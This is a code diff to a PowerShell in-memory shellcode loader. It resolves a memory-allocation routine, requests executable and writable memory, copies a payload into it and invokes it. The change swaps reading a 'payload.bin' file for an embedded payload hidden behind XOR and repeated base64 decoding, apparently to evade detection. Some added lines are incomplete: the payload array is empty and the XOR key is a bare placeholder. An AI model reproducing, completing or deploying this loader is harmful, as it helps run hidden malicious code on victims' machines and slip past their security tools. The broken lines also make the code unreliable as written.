@@ -21,9 +21,24 @@ function func_get_delegate_type_new_a {
 }
 
 If ([IntPtr]::size -eq 0x8) {
-    [Byte[]]$acode = [System.IO.File]::ReadAllBytes('payload.bin')
+
+    [Byte[]]$var_code = 
+    for ($x = 0; $x -lt $var_code.Count; $x++) {
+        $var_code[$x] = $var_code[$x] -bxor key 
+        [char[]][int[]]$char = $var_code
+    }
+
+    $b64 =  $char  -join ''
+
+    for ($x = 0; $x -lt 4; $x++){
+        $b64 = $b64 -replace "-", "/"
+        $b64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));
+    }
+    $b64 = $b64 -replace "-", "/"
+    [byte[]]$acode = [System.Convert]::FromBase64String($b64);
+
     $var_va = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address_new_b), (func_get_delegate_type_new_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
-    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $acode.Length, 12288, 64)
+    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $acode.Length, 12288, 0x40)
     [Runtime.InteropServices.Marshal]::Copy($acode, 0, $var_buffer, $acode.length)
     $var_runme = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type_new_a @([IntPtr]) ([Void])))
     $var_runme.Invoke([IntPtr]::Zero)
